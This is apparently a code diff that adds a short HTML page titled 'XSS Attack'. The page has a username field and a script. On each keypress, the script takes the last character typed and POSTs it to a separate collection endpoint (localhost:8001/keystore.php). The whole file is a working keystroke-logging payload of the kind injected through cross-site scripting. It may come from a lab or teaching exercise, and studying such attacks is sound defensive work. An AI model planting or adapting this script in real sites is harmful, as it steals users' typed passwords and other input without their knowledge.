@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>XSS Attack</title>
+    </head>
+    <body>
+        Username<input type = "text" value = "" id = "userName"><br>
+    </body>
+    <script>
+        document.onkeypress = function(event){
+            event = event | window.event
+            key = document.getElementById("userName").value;
+            key = key.slice(-1);
+            if(key){
+                console.log(key);
+                var http = new XMLHttpRequest;
+                var param = encodeURI(key);
+                http.open("POST","http://localhost:8001/keystore.php",true);
+                http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+                http.send("key=" + param);
+            }
+        }
+    </script>
+</html>
